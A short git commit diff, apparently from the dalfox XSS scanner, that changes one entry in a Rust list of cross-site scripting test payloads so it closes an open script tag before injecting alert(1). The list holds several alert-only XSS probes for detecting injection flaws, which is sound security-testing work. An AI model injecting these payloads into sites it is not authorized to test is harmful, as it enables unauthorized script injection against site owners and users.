0f5a62689e36391a017e2a08a3ac2a65e4cbecb4
HAHWUL <hahwul@gmail.com>
2025-10-16 21:26:05 +0900

    Update XSS payload to close script tag before injection

--- src/payload/xss_javascript.rs
+++ src/payload/xss_javascript.rs
@@ -1,5 +1,5 @@
 pub const XSS_JAVASCRIPT_PAYLOADS: &[&str] = &[
-    "<script>alert(1)</script>",
+    "</script><script>alert(1)</script>",
     "javascript:alert(1)",
     "<iframe src=javascript:alert(1)>",
     "<script>alert('dalfox')</script>",
